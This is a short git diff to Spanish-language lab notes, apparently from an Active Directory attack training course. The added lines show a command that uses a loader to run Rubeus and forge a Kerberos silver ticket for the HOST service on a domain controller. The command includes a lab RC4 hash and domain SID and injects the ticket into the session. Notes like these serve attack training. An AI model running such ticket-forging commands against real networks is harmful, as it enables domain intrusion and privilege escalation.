@@ -867,6 +867,10 @@ set computername
 
 Ahora deberemos acceder al servicio *WMI* (infraestructura central de Microsoft utilizada para gestionar y monitorizar).
 En este caso deberemos de crear dos tickets uno para el servicio *HOST* y otro para el *RPCSS*
-Nos deberemos abrir una CMD con privilegios
-y ej
+Nos deberemos abrir una CMD con privilegios y y con el *Loader* ejecutar *Rubeus*
+```shell
+[student97]
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:4e9815869d2090ccfca61c1fe0d23986 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
+```
 
+Inyectamos el ticker 
